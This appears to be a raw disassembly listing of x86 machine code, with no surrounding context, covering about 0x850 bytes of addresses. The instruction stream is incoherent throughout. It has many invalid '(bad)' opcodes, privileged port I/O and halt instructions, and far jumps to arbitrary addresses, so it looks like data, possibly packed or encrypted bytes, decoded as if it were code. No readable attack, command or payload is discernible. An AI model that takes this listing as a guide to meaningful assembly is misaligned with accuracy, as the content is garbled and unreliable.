  418f75:	call   0x197a:0x9f57881b
  418f7c:	popa   
  418f7d:	cmp    BYTE PTR [ecx+0x34191e4d],ch
  418f83:	jl     0x418f4f
  418f85:	xor    al,0x58
  418f87:	mov    ds:0x408b9d4c,eax
  418f8c:	ja     0x418f4a
  418f8e:	sbb    eax,0x81768e9c
  418f93:	add    eax,0x74ba9d41
  418f98:	dec    esi
  418f99:	inc    esp
  418f9a:	arpl   WORD PTR [ebx],sp
  418f9c:	inc    ebp
  418f9d:	add    eax,0x8385e5cb
  418fa2:	pop    eax
  418fa3:	sub    DWORD PTR [ecx+ecx*8],ebx
  418fa6:	ud0    eax,DWORD PTR [eax-0x6c]
  418faa:	and    esi,ecx
  418fac:	in     al,dx
  418fad:	lea    edi,[ecx+ecx*8]
  418fb0:	(bad)  
  418fb1:	loopne 0x418faa
  418fb3:	add    edi,esi
  418fb5:	dec    ecx
  418fb6:	mov    ebp,0x3c685a3a
  418fbb:	int3   
  418fbc:	dec    esp
  418fbd:	outs   dx,DWORD PTR ds:[esi]
  418fbe:	add    ah,BYTE PTR [ebp+0x24]
  418fc1:	popa   
  418fc2:	js     0x418ff2
  418fc4:	nop
  418fc5:	mov    ?,WORD PTR [edi]
  418fc7:	xchg   edi,eax
  418fc8:	cli    
  418fc9:	or     DWORD PTR [ebx+0x7177183d],esp
  418fcf:	lods   eax,DWORD PTR ds:[esi]
  418fd0:	add    BYTE PTR [ebp-0x13529c41],al
  418fd6:	mov    al,0xa4
  418fd8:	inc    esp
  418fd9:	mov    ss,WORD PTR [ebx]
  418fdb:	and    dl,ch
  418fdd:	ins    DWORD PTR es:[edi],dx
  418fde:	jecxz  0x418fce
  418fe0:	call   0x1f2b8817
  418fe5:	sbb    DWORD PTR [ebp+0x63bcbc92],ebp
  418feb:	mov    al,ds:0x9b7ba887
  418ff0:	adc    al,0xb6
  418ff2:	test   al,0x0
  418ff4:	xor    eax,edx
  418ff6:	xchg   DWORD PTR [ebp+0x6893a745],ecx
  418ffc:	or     ebx,DWORD PTR [edi-0x64f5177d]
  419002:	retf   
  419003:	jle    0x418fff
  419005:	enter  0x3793,0x9
  419009:	pop    ss
  41900a:	inc    esi
  41900b:	jmp    0x9e61:0x84d41059
  419012:	pop    ss
  419013:	mov    ecx,0x42f7200f
  419018:	xchg   ebp,eax
  419019:	adc    al,0xd
  41901b:	bnd js 0x419036
  41901e:	aad    0xbd
  419020:	pop    ds
  419021:	stc    
  419022:	inc    edi
  419023:	(bad)  
  419024:	cmp    ch,BYTE PTR [ebx+0x3b]
  419027:	xchg   ecx,eax
  419028:	(bad)  
  419029:	mov    cl,0xcb
  41902b:	in     al,dx
  41902c:	test   ebx,ecx
  41902e:	loope  0x41905f
  419030:	loopne 0x419097
  419032:	leave  
  419033:	hlt    
  419034:	add    ebp,DWORD PTR [ebp*2-0x2d06e4c2]
  41903b:	sub    ch,BYTE PTR [eax-0x8]
  41903e:	repz inc edx
  419040:	and    eax,0x98e8a0e7
  419045:	loope  0x4190c5
  419047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419048:	and    DWORD PTR [ecx+0x2e8ecf7c],edi
  41904e:	adc    ah,BYTE PTR [ebp+0x74b9f36]
  419054:	(bad)  
  419055:	push   es
  419056:	mov    dh,BYTE PTR [eax]
  419058:	sub    esi,DWORD PTR [ecx+eiz*8-0x4519d8b5]
  41905f:	inc    esp
  419060:	inc    esp
  419061:	imul   BYTE PTR [edx+edi*4-0x2caf6258]
  419068:	in     eax,0x19
  41906a:	push   ds
  41906b:	hlt    
  41906c:	and    edi,edx
  41906e:	jns    0x419086
  419070:	retf   
  419071:	cmp    BYTE PTR [edi+0x7a8c2534],dh
  419077:	mov    edx,0xe85bb095
  41907c:	or     eax,0x1b3bfc06
  419081:	mov    ebx,ebp
  419083:	in     eax,dx
  419084:	jns    0x419059
  419086:	pop    ds
  419087:	jp     0x4190ed
  419089:	xchg   esi,eax
  41908a:	fild   QWORD PTR [eax-0x224762f1]
  419090:	xor    edi,eax
  419092:	shr    BYTE PTR [ebp+eax*4-0x1db5d62],0xf9
  41909a:	add    al,0xae
  41909c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41909d:	cdq    
  41909e:	aaa    
  41909f:	out    0x1e,eax
  4190a1:	push   ebx
  4190a2:	or     eax,0x69f337b9
  4190a7:	mov    dl,0xb2
  4190a9:	test   al,0x43
  4190ab:	push   esi
  4190ac:	xor    edi,esi
  4190ae:	dec    esi
  4190af:	repnz sbb bl,cl
  4190b2:	(bad)  
  4190b3:	and    cl,BYTE PTR [edx+0x1a8e11b3]
  4190b9:	scas   al,BYTE PTR es:[edi]
  4190ba:	(bad)  [eax-0x4180c3c3]
  4190c0:	bound  ebx,QWORD PTR [esi]
  4190c2:	sub    cl,BYTE PTR [ebx+0x5a51f91b]
  4190c8:	test   BYTE PTR [ebp-0x5c1ae941],dh
  4190ce:	fcmovne st,st(3)
  4190d0:	mov    esp,0xf4ecc119
  4190d5:	pop    ebp
  4190d6:	push   edx
  4190d7:	inc    ebx
  4190d8:	loope  0x4190e2
  4190da:	mov    al,0xc4
  4190dc:	nop
  4190dd:	enter  0x42c1,0x98
  4190e1:	mov    ds:0xf6b5c5ed,eax
  4190e6:	add    esi,esp
  4190e8:	jecxz  0x41906b
  4190ea:	addr16 sub al,0x24
  4190ed:	xor    dh,ch
  4190ef:	adc    al,0x69
  4190f1:	mov    ds:0x7765abc4,al
  4190f6:	pop    ds
  4190f7:	lods   al,BYTE PTR ds:[esi]
  4190f8:	cmp    ebp,DWORD PTR [ecx+0x4d3cd043]
  4190fe:	jge    0x419152
  419100:	sub    eax,0x1d88b10a
  419105:	mov    ecx,0x42c29355
  41910a:	push   0x4ba61bda
  41910f:	inc    edx
  419110:	inc    ecx
  419111:	mov    ebx,0x49be8f3b
  419116:	mov    ah,0x6f
  419118:	push   es
  419119:	std    
  41911a:	mov    edi,0xf0775894
  41911f:	mov    eax,0x61b7bea6
  419124:	add    DWORD PTR [esi-0x51be9edf],ebx
  41912a:	push   ebx
  41912b:	sub    al,0x5e
  41912d:	cdq    
  41912e:	cs xchg ebp,eax
  419130:	les    ebp,FWORD PTR [ecx+0x7]
  419133:	sub    edx,DWORD PTR [edi-0x2]
  419136:	mov    esi,0x805cceb4
  41913b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41913c:	sbb    eax,0xd8e9b0e9
  419141:	dec    edx
  419142:	mov    es,WORD PTR [ecx-0x5e8a14f2]
  419148:	push   ss
  419149:	in     eax,0x1d
  41914b:	pop    ebx
  41914c:	push   0x76
  41914e:	iret   
  41914f:	pop    esi
  419150:	inc    ebp
  419151:	mov    ds,edi
  419153:	icebp  
  419154:	iret   
  419155:	jnp    0x41913b
  419157:	enter  0xe916,0xc6
  41915b:	xchg   edi,eax
  41915c:	retf   0x3b67
  41915f:	retf   0xa449
  419162:	imul   ebp,DWORD PTR [eax-0x28890377],0xffffffdc
  419169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41916a:	pop    ebp
  41916b:	lods   al,BYTE PTR ds:[esi]
  41916c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41916d:	addr16 out 0x55,eax
  419170:	or     DWORD PTR [esi-0x4a],esp
  419173:	les    edx,FWORD PTR [ebx-0x266dd462]
  419179:	jbe    0x419192
  41917b:	mov    esi,0xcbd4e94d
  419180:	xchg   ecx,eax
  419181:	sub    edx,DWORD PTR [edx-0x25c54ccb]
  419187:	out    dx,al
  419188:	jae    0x419129
  41918a:	mov    ebx,0xd174da96
  41918f:	xchg   ebx,eax
  419190:	cmp    BYTE PTR [eax+ebp*1],al
  419193:	enter  0x6327,0xb9
  419197:	push   esp
  419198:	inc    edi
  419199:	fdivr  DWORD PTR [edi-0x14585bcd]
  41919f:	mov    bh,BYTE PTR [eax-0x68]
  4191a2:	shr    BYTE PTR [edx],cl
  4191a4:	sub    al,BYTE PTR [edx-0x62]
  4191a7:	mov    esi,0x97f85ae
  4191ac:	push   es
  4191ad:	jl     0x41914c
  4191af:	pop    eax
  4191b0:	and    BYTE PTR [ecx+0x3a],ch
  4191b3:	addr16 pop ds
  4191b5:	mov    ah,0x5b
  4191b7:	cdq    
  4191b8:	popf   
  4191b9:	(bad)  
  4191bb:	push   esi
  4191bc:	sub    BYTE PTR [eax-0x76092038],0xbc
  4191c3:	push   es
  4191c4:	jnp    0x41916b
  4191c6:	xchg   ebp,eax
  4191c7:	sahf   
  4191c8:	mov    edx,0x654d8102
  4191cd:	mov    bh,0xd2
  4191cf:	lock je 0x41921c
  4191d2:	push   0xd32947f9
  4191d7:	stc    
  4191d8:	lods   eax,DWORD PTR ds:[esi]
  4191d9:	push   ebx
  4191da:	cmp    DWORD PTR [esi-0x6c],edx
  4191dd:	cmp    eax,0xf0f567a0
  4191e2:	outs   dx,BYTE PTR ds:[esi]
  4191e3:	lock mov ebx,0x27f9e7f3
  4191e9:	stc    
  4191ea:	mov    eax,0x897b67dc
  4191ef:	mov    al,ds:0x6cfce71d
  4191f4:	xor    eax,0x90ed92d1
  4191f9:	repnz sahf 
  4191fb:	aad    0x8b
  4191fd:	jp     0x4191ff
  4191ff:	jp     0x419225
  419201:	cmp    DWORD PTR [ecx+0x69],esp
  419204:	cmp    eax,0xc73f7b6e
  419209:	or     ecx,edi
  41920b:	xlat   BYTE PTR ds:[ebx]
  41920c:	add    esp,ebp
  41920e:	retf   0x7ce7
  419211:	dec    esi
  419212:	sub    esi,esi
  419214:	and    eax,0x6c467d54
  419219:	cmp    DWORD PTR [ebp-0x544f9fc0],edi
  41921f:	mov    ds:0x8000b77,eax
  419224:	icebp  
  419225:	adc    al,0x99
  419227:	jmp    0x7c88c1
  41922c:	repnz pop es
  41922e:	popf   
  41922f:	xchg   ebp,eax
  419230:	dec    esp
  419231:	mov    ds:0x7056b42a,eax
  419236:	dec    ebp
  419237:	fstp   DWORD PTR [esi]
  419239:	cmc    
  41923a:	jns    0x419289
  41923c:	loop   0x41927e
  41923e:	sub    ebp,edx
  419240:	mov    dl,0x39
  419242:	mov    esp,0x1f305004
  419247:	test   eax,0xeafa0f25
  41924c:	fcmovne st,st(3)
  41924e:	fisttp QWORD PTR [ebx+eiz*1+0x55127e49]
  419255:	xchg   ebp,eax
  419256:	adc    DWORD PTR [edi+esi*4-0x2e],ebx
  41925a:	sub    ebx,DWORD PTR [ecx+0x4e]
  41925d:	cmp    BYTE PTR [esi],bl
  41925f:	ficom  WORD PTR [edi]
  419261:	dec    eax
  419262:	pop    ebp
  419263:	sti    
  419264:	inc    esp
  419265:	idiv   eax
  419267:	mov    dh,0x82
  419269:	imul   edi,DWORD PTR [eax+0x50fad3d4],0xffffffba
  419270:	in     eax,0x7c
  419272:	loop   0x419258
  419274:	clc    
  419275:	mov    esp,DWORD PTR [ecx+0x65]
  419278:	fisttp DWORD PTR [edx-0x22dee248]
  41927e:	pop    ecx
  41927f:	frstor [edx]
  419281:	sub    ah,BYTE PTR [eax]
  419283:	cmp    dl,BYTE PTR ds:0xa8f1586e
  419289:	call   0x1d3f3902
  41928e:	mov    esp,esp
  419290:	int    0xb9
  419292:	shl    eax,0xe6
  419295:	retf   0x5139
  419298:	retf   
  419299:	cmp    ecx,DWORD PTR [ebp+0x61d4a7f0]
  41929f:	push   ss
  4192a0:	ret    0xb490
  4192a3:	aam    0xd8
  4192a5:	push   esp
  4192a6:	add    dl,BYTE PTR [edi]
  4192a8:	gs adc ah,0xe5
  4192ac:	cmp    eax,0x23a0ab15
  4192b1:	dec    ecx
  4192b2:	sbb    DWORD PTR [ecx],ebp
  4192b4:	idiv   dl
  4192b6:	int    0xc
  4192b8:	or     al,0xa4
  4192ba:	imul   ebp,DWORD PTR [ecx-0x2fe51b42],0xa
  4192c1:	lea    edi,[esi+eax*8+0x6e]
  4192c5:	lock iret 
  4192c7:	add    al,0x40
  4192c9:	push   ss
  4192ca:	add    dh,ah
  4192cc:	sti    
  4192cd:	push   cs
  4192ce:	mov    esp,0x27dc477
  4192d3:	loope  0x41925a
  4192d5:	jmp    0x4192a7
  4192d7:	std    
  4192d8:	and    edx,DWORD PTR [ecx+0x3e]
  4192db:	fsubr  QWORD PTR [edi+0x67]
  4192de:	sbb    esp,DWORD PTR [eax+0x5a]
  4192e1:	or     DWORD PTR [esi+edi*8],esi
  4192e4:	fbstp  TBYTE PTR [esi]
  4192e6:	mov    WORD PTR [ebx+0x10bee501],ss
  4192ec:	lds    esi,FWORD PTR [ecx+ecx*2-0x148a211a]
  4192f3:	or     al,0x1f
  4192f5:	jmp    0x2b9bc384
  4192fa:	jae    0x4192c3
  4192fc:	out    0x9e,eax
  4192fe:	pop    ebx
  4192ff:	push   ds
  419300:	(bad)  
  419301:	inc    eax
  419302:	mov    bh,BYTE PTR [eax]
  419304:	or     esi,DWORD PTR [ecx+ebx*2]
  419307:	fist   DWORD PTR [eax+0x7ca4be6e]
  41930d:	in     al,0x5b
  41930f:	call   0xf10e:0xf0ff5d75
  419316:	mov    ch,BYTE PTR [edi-0x95605f0]
  41931c:	inc    esp
  41931d:	test   eax,0x7c225709
  419322:	lock popa 
  419324:	fdiv   DWORD PTR [esi]
  419326:	mov    ah,ah
  419328:	push   ebp
  419329:	xlat   BYTE PTR ds:[ebx]
  41932a:	inc    ecx
  41932b:	in     al,dx
  41932c:	xor    ecx,esp
  41932e:	fdiv   st(3),st
  419330:	sbb    BYTE PTR [ecx-0x552d6e44],bl
  419336:	mov    ebx,0x6ba46c39
  41933b:	jmp    0x4192e0
  41933d:	clc    
  41933e:	add    BYTE PTR [esi+0x55388c87],cl
  419344:	mov    al,ds:0x6d354986
  419349:	push   0x47
  41934b:	call   0x2ccd376e
  419350:	push   es
  419351:	daa    
  419352:	push   eax
  419353:	repz push edi
  419355:	push   edi
  419356:	call   DWORD PTR [eiz*4+0x1774b9cf]
  41935d:	outs   dx,DWORD PTR ds:[esi]
  41935e:	cmp    al,0xd1
  419360:	push   esi
  419361:	xor    BYTE PTR [ebp-0x370ae82e],al
  419367:	aaa    
  419368:	adc    al,0xb0
  41936a:	mov    ds:0xb44511ec,al
  41936f:	fs retf 0x158e
  419373:	out    dx,al
  419374:	and    al,0x9d
  419376:	fld    TBYTE PTR [ebx-0x611b1310]
  41937c:	cmp    BYTE PTR [eax-0x41],cl
  41937f:	push   ebp
  419380:	jp     0x419377
  419382:	xchg   ebx,eax
  419383:	aad    0x25
  419385:	arpl   di,bp
  419387:	out    0xd6,eax
  419389:	mov    ds:0x352bbdcb,eax
  41938e:	hlt    
  41938f:	xchg   BYTE PTR [edx-0x2d],dh
  419392:	and    esi,DWORD PTR [edx+0x34bedfb6]
  419398:	jb     0x419341
  41939a:	popf   
  41939b:	in     eax,0xf7
  41939d:	jle    0x4193ef
  41939f:	and    dh,BYTE PTR [ebx+0x55]
  4193a2:	fcomip st,st(2)
  4193a4:	mov    esp,0xf359571
  4193a9:	in     eax,0xc7
  4193ab:	icebp  
  4193ac:	add    eax,0x1ffc6e72
  4193b1:	adc    DWORD PTR [ebx-0xc],eax
  4193b4:	add    edi,DWORD PTR [edx]
  4193b6:	lahf   
  4193b7:	repnz xor al,0xda
  4193ba:	xor    al,0x76
  4193bc:	xor    al,0xa1
  4193be:	sbb    edx,DWORD PTR [edx+0x22a560b4]
  4193c4:	mov    ?,eax
  4193c6:	enter  0xd377,0xc3
  4193ca:	mov    edi,0xe887f3e4
  4193cf:	je     0x419418
  4193d1:	dec    esi
  4193d2:	jmp    0xeef1:0xdc0e85ca
  4193d9:	sub    al,0xe0
  4193db:	bound  edi,QWORD PTR [eax]
  4193dd:	sub    BYTE PTR [ebx-0x889fdfc],bh
  4193e3:	in     eax,0xe6
  4193e5:	sub    eax,0xaade0b1c
  4193ea:	fistp  QWORD PTR ds:0xab08019
  4193f0:	jge    0x41941a
  4193f2:	mov    dl,0x4
  4193f4:	retf   0x25b0
  4193f7:	js     0x419436
  4193f9:	mov    cl,0x1b
  4193fb:	lods   eax,DWORD PTR ds:[esi]
  4193fc:	test   al,0x85
  4193fe:	lahf   
  4193ff:	add    esp,DWORD PTR [eax-0x2b8ab6e7]
  419405:	shl    BYTE PTR [esi],0x7
  419408:	sub    al,0x33
  41940a:	out    0x4,eax
  41940c:	aam    0x20
  41940e:	mov    dh,ah
  419410:	stos   DWORD PTR es:[edi],eax
  419411:	or     ecx,DWORD PTR [ecx+esi*8+0x592f2eb3]
  419418:	adc    ebx,edi
  41941a:	daa    
  41941b:	jmp    0x2950:0x7cc48e14
  419422:	jne    0x4193a8
  419424:	jmp    0xbf1c:0x10149203
  41942b:	inc    ecx
  41942c:	and    al,0xb9
  41942e:	mov    dl,0xc3
  419430:	out    dx,eax
  419431:	test   DWORD PTR [ecx],eax
  419433:	cdq    
  419434:	jl     0x4193db
  419436:	pop    ebx
  419437:	mov    ds:0x36f8f8d7,al
  41943c:	ins    DWORD PTR es:[edi],dx
  41943d:	xor    al,0xac
  41943f:	xor    esp,DWORD PTR [edx]
  419441:	test   al,0x43
  419443:	call   0x84c99d9f
  419448:	push   edx
  419449:	pop    ebp
  41944a:	ins    DWORD PTR es:[edi],dx
  41944b:	mov    edx,0xd2b39e73
  419450:	out    0x4c,al
  419452:	lahf   
  419453:	dec    ebx
  419454:	dec    esi
  419455:	ror    BYTE PTR [eax-0x4eac0f27],0x64
  41945c:	xchg   ecx,eax
  41945d:	pop    ebp
  41945e:	push   esi
  41945f:	ins    DWORD PTR es:[edi],dx
  419460:	imul   BYTE PTR [ecx]
  419462:	into   
  419463:	add    ecx,edx
  419465:	xchg   ebp,eax
  419466:	aam    0x3c
  419468:	test   DWORD PTR [edi],eax
  41946a:	jno    0x41949e
  41946c:	loope  0x419413
  41946e:	xor    edi,eax
  419470:	retf   0xe272
  419473:	push   ebp
  419474:	inc    esp
  419475:	(bad)  
  419476:	stos   BYTE PTR es:[edi],al
  419477:	lahf   
  419478:	ficom  WORD PTR gs:[edi-0x1a]
  41947c:	xchg   edi,eax
  41947d:	daa    
  41947e:	out    0xe4,al
  419480:	sbb    BYTE PTR [ecx],bl
  419482:	jne    0x419480
  419484:	imul   DWORD PTR [edi+eiz*4+0x2f74d0f5]
  41948b:	test   DWORD PTR [ecx+ecx*2],esp
  41948e:	out    dx,al
  41948f:	enter  0x139b,0x54
  419493:	add    DWORD PTR [ecx],esp
  419495:	imul   ecx,DWORD PTR [edi-0x54],0x3fdf80c6
  41949c:	jb     0x419465
  41949e:	fdivr  QWORD PTR [eax-0x30]
  4194a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194a2:	mov    esp,DWORD PTR [eax+eiz*2-0xd]
  4194a6:	lock xchg ecx,esi
  4194a9:	call   0xc57b:0xf5202c74
  4194b0:	xor    cl,ch
  4194b2:	test   BYTE PTR [esi+esi*8+0x3b5f8479],0x9f
  4194ba:	adc    BYTE PTR [eax],bh
  4194bc:	dec    ecx
  4194bd:	cli    
  4194be:	test   ebp,ebp
  4194c0:	sbb    eax,0x5aac5a99
  4194c5:	ds cmp edx,ecx
  4194c8:	adc    bl,BYTE PTR [ebp+0x6d]
  4194cb:	scas   al,BYTE PTR es:[edi]
  4194cc:	pop    es
  4194cd:	test   ch,bl
  4194cf:	mov    dh,0xd2
  4194d1:	dec    esp
  4194d2:	mov    bl,BYTE PTR [esi+0x5a]
  4194d5:	sub    DWORD PTR [ecx-0x1a],edi
  4194d8:	mov    dl,0xd9
  4194da:	cs dec esp
  4194dc:	ret    
  4194dd:	gs fwait
  4194df:	data16 mov ch,0x9f
  4194e2:	je     0x4194d1
  4194e4:	mov    edx,0x3da3fcbd
  4194e9:	(bad)  
  4194ea:	fcmovbe st,st(2)
  4194ec:	call   0x8cb6494d
  4194f1:	and    dh,0xb7
  4194f4:	lds    ebx,FWORD PTR [edx-0x38]
  4194f7:	jmp    FWORD PTR [edx-0x7e]
  4194fa:	jno    0x41955a
  4194fc:	mov    dl,0xdd
  4194fe:	mov    bh,dh
  419500:	add    eax,0x1e543071
  419505:	daa    
  419506:	mov    dl,0x74
  419508:	fmulp  st(0),st
  41950a:	push   cs
  41950b:	jb     0x4194d2
  41950d:	jg     0x4194eb
  41950f:	out    dx,eax
  419510:	repnz xor DWORD PTR [edx-0x20],0x5f38993
  419518:	pop    ds
  419519:	mov    esp,0xe13e3ff9
  41951e:	mov    edi,0x3f5ec6e9
  419523:	add    DWORD PTR [esi],esp
  419525:	leave  
  419526:	(bad)
  419529:	idiv   BYTE PTR [eax]
  41952b:	cmp    al,BYTE PTR [ebp-0x798fac9e]
  419531:	inc    esp
  419532:	mov    ebp,0x8197e604
  419537:	(bad)  
  419538:	cmc    
  419539:	mov    WORD PTR [esi-0xd],ss
  41953c:	xchg   esi,eax
  41953d:	je     0x41959b
  41953f:	test   al,0x21
  419541:	dec    ecx
  419542:	pushf  
  419543:	aas    
  419544:	or     bl,BYTE PTR [edx+ecx*8]
  419547:	inc    edi
  419548:	or     al,0x9e
  41954a:	cmp    edx,esp
  41954c:	in     eax,dx
  41954d:	or     ebp,edx
  41954f:	mov    esp,0x92e856d4
  419554:	sbb    eax,0xe494bbc2
  419559:	imul   ebx,DWORD PTR [edx+0x7b],0x55
  41955d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41955e:	pop    eax
  41955f:	out    0x55,eax
  419561:	and    ah,BYTE PTR [ebp-0x45f6af0a]
  419567:	add    eax,0x38c0436e
  41956c:	and    cl,BYTE PTR [ebp-0x6]
  41956f:	in     al,dx
  419570:	lds    eax,FWORD PTR [edx+0x2bf2e51b]
  419576:	gs pop ebp
  419578:	sub    al,0x19
  41957a:	retf   
  41957b:	mov    ebx,0x5ea5b88e
  419580:	mov    ds:0xa7dacc45,eax
  419585:	mov    ebx,0x8455c38d
  41958a:	shr    dh,1
  41958c:	or     DWORD PTR [ebx+0x3cb55242],esp
  419592:	mov    edx,esi
  419594:	in     eax,0xa6
  419596:	mov    edi,0xbba0dc78
  41959b:	ss cwde 
  41959d:	dec    ebx
  41959e:	leave  
  41959f:	push   ss
  4195a0:	jecxz  0x419591
  4195a2:	xchg   edi,eax
  4195a3:	cmp    edi,DWORD PTR [esi]
  4195a5:	fwait
  4195a6:	call   0x46678aff
  4195ab:	mov    ebp,0x298c09d2
  4195b0:	jb     0x4195fc
  4195b2:	push   ds
  4195b3:	lods   al,BYTE PTR ds:[esi]
  4195b4:	rol    DWORD PTR [ecx+0x7ccb0257],cl
  4195ba:	lods   eax,DWORD PTR ds:[esi]
  4195bb:	out    0x9,eax
  4195bd:	jle    0x41957a
  4195bf:	adc    al,0xea
  4195c1:	and    BYTE PTR [ebx+0x41],dl
  4195c4:	ss jnp 0x4195da
  4195c7:	fs ds test al,0xf5
  4195cb:	shl    DWORD PTR [ecx-0x11ec59b9],0xac
  4195d2:	mov    ecx,0xadf24404
  4195d7:	pop    esi
  4195d8:	ja     0x419637
  4195da:	push   ds
  4195db:	(bad)  ds:0xf1e5ebac
  4195e1:	das    
  4195e2:	sti    
  4195e3:	push   esi
  4195e4:	data16 aam 0xb3
  4195e7:	and    al,0x86
  4195e9:	jecxz  0x41959f
  4195eb:	dec    edx
  4195ec:	popf   
  4195ed:	popf   
  4195ee:	pop    ebx
  4195ef:	push   es
  4195f0:	sbb    DWORD PTR [ebx-0x33],ebp
  4195f3:	fcom   QWORD PTR [esi-0x4f]
  4195f6:	xor    BYTE PTR [edx+edx*8+0x68],ah
  4195fa:	scas   al,BYTE PTR es:[edi]
  4195fb:	and    eax,0xe722b1ab
  419600:	pop    ds
  419601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419602:	dec    ebx
  419603:	inc    ebp
  419604:	mov    ch,0xcc
  419606:	cdq    
  419607:	add    bl,dl
  419609:	fbstp  TBYTE PTR [eax+0x52]
  41960c:	mov    ch,0x81
  41960e:	mov    dh,0xf4
  419610:	dec    ebp
  419611:	jge    0x41965f
  419613:	add    ecx,edi
  419615:	mov    bh,0xeb
  419617:	push   0xffffffab
  419619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41961a:	into   
  41961b:	mov    eax,ds:0xf6c8a84f
  419620:	sbb    eax,0x970613a9
  419625:	scas   eax,DWORD PTR es:[edi]
  419626:	imul   eax,DWORD PTR [ebp+0x5fdba3d7],0xa
  41962d:	(bad)  
  41962e:	mov    eax,ds:0xb4b8dd50
  419633:	leave  
  419634:	sub    al,0xc5
  419636:	mov    edx,0x6962f3a4
  41963b:	inc    ecx
  41963c:	mov    ch,0x91
  41963e:	popf   
  41963f:	icebp  
  419640:	mov    al,ds:0x2072b9fb
  419645:	pop    ss
  419646:	les    ebx,FWORD PTR [ecx-0x2b4258bf]
  41964c:	cmp    al,0x3c
  41964e:	in     eax,dx
  41964f:	and    BYTE PTR [esp+ebx*4+0x1480e62b],ah
  419656:	lods   al,BYTE PTR ds:[esi]
  419657:	and    al,0xc8
  419659:	dec    esi
  41965a:	sub    bl,BYTE PTR [ecx]
  41965c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41965d:	bound  edi,QWORD PTR [edx-0x10a3904c]
  419663:	sbb    esi,ebp
  419665:	add    al,0xaa
  419667:	jmp    0xeb07:0x8e8cc871
  41966e:	mov    ds:0xa8611ea7,al
  419673:	cs test al,0x4e
  419676:	inc    ah
  419678:	xchg   esi,eax
  419679:	mov    eax,ds:0x73fb1bf5
  41967e:	dec    ebx
  41967f:	adc    edi,edx
  419681:	daa    
  419682:	mov    eax,0xbe9ba3b1
  419687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419688:	je     0x41963c
  41968a:	mov    bl,0xa3
  41968c:	dec    ebp
  41968d:	cwde   
  41968e:	cmp    al,0xbd
  419690:	out    dx,al
  419691:	lods   eax,DWORD PTR ds:[esi]
  419692:	out    dx,al
  419693:	mov    edx,0x50b0387c
  419698:	imul   ecx,DWORD PTR [ecx+0x2f891a64],0x6ea70d08
  4196a2:	mov    eax,0xfc0549b0
  4196a7:	ret    0xd9ba
  4196aa:	mov    esp,0x3676db94
  4196af:	rol    DWORD PTR [eax-0x3b],0xbd
  4196b3:	and    al,0x4d
  4196b5:	lea    esp,[edx]
  4196b7:	push   cs
  4196b8:	add    eax,0xb6f6bfda
  4196bd:	icebp  
  4196be:	inc    ecx
  4196bf:	imul   esi,ebx,0x3460ad
  4196c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196c6:	sub    DWORD PTR [ebp+0x320a7a16],eax
  4196cc:	pop    edx
  4196cd:	sub    bl,BYTE PTR [edx+ecx*4]
  4196d0:	xor    eax,0x481b861c
  4196d5:	xchg   edi,eax
  4196d6:	ret    0x6314
  4196d9:	and    eax,0xed1da8f7
  4196de:	mov    ebx,0x18eb0e94
  4196e3:	dec    eax
  4196e4:	mov    BYTE PTR [ebp+0x1f77b18c],dl
  4196ea:	pop    edi
  4196eb:	into   
  4196ec:	mov    al,ds:0x3f752662
  4196f1:	call   0x2750:0x5c86f005
  4196f8:	push   ds
  4196f9:	ret    0xcd35
  4196fc:	popa   
  4196fd:	popf   
  4196fe:	jnp    0x419700
  419700:	retf   
  419701:	lods   eax,DWORD PTR ds:[esi]
  419702:	pushf  
  419703:	pop    ds
  419704:	lods   eax,DWORD PTR ds:[esi]
  419705:	retf   
  419706:	icebp  
  419707:	sub    DWORD PTR [ebx+0x9],ebp
  41970a:	and    eax,0xa97d1735
  41970f:	add    DWORD PTR [ebp-0x34a44462],0xfffffffa
  419716:	test   esp,0x89b16df1
  41971c:	sbb    ecx,edi
  41971e:	mov    ecx,0xf980ebb3
  419723:	cmp    ebx,DWORD PTR es:[edx+0x7db9663b]
  41972a:	jbe    0x419716
  41972c:	pop    ecx
  41972d:	inc    eax
  41972e:	adc    al,0x87
  419730:	jbe    0x419762
  419732:	jb     0x419718
  419734:	int3   
  419735:	xor    DWORD PTR [ebx+0x608bc124],esi
  41973b:	jp     0x4196d2
  41973d:	sahf   
  41973e:	leave  
  41973f:	bnd jl 0x4197a7
  419742:	ret    
  419743:	hlt    
  419744:	push   ebx
  419745:	sbb    DWORD PTR ds:0x9939cb7f,edi
  41974b:	xchg   edx,eax
  41974c:	adc    BYTE PTR [ebp-0x693a958d],dl
  419752:	xchg   esp,eax
  419753:	jmp    0x3b229af4
  419758:	and    cl,cl
  41975a:	mov    WORD PTR [ebp-0x4bccac6b],cs
  419760:	bound  ebx,QWORD PTR [edx+0x52d562ea]
  419766:	pop    ebx
  419767:	out    dx,al
  419768:	pop    ebx
  419769:	nop
  41976a:	jns    0x4197b7
  41976c:	jmp    FWORD PTR [ecx-0x1c]
  41976f:	ss sub al,0xa5
  419772:	jmp    0x49062ca2
  419777:	pop    esp
  419778:	leave  
  419779:	es dec esi
  41977b:	stos   BYTE PTR es:[edi],al
  41977c:	loop   0x419724
  41977e:	lahf   
  41977f:	dec    esi
  419780:	xchg   esp,eax
  419781:	in     eax,dx
  419782:	sbb    BYTE PTR [eax-0x74612f2c],ch
  419788:	xor    eax,0x23c4fc52
  41978d:	xor    eax,0x8f78feae
  419792:	fisttp QWORD PTR [edx]
  419794:	mov    ch,0x9d
  419796:	aaa    
  419797:	test   eax,0x79f09e8f
  41979c:	and    cl,cl
  41979e:	xor    DWORD PTR [edi-0x5211bb97],0xffffffa6
  4197a5:	call   0x3bcd:0xb238deab
  4197ac:	fwait
  4197ad:	push   0xefa6a8a2
  4197b2:	pop    es
  4197b3:	cmc    
  4197b4:	cli    
  4197b5:	retf   0x3fc4
  4197b8:	sub    al,0xac
  4197ba:	enter  0x71a0,0xa7
  4197be:	push   esi
  4197bf:	outs   dx,DWORD PTR ds:[esi]
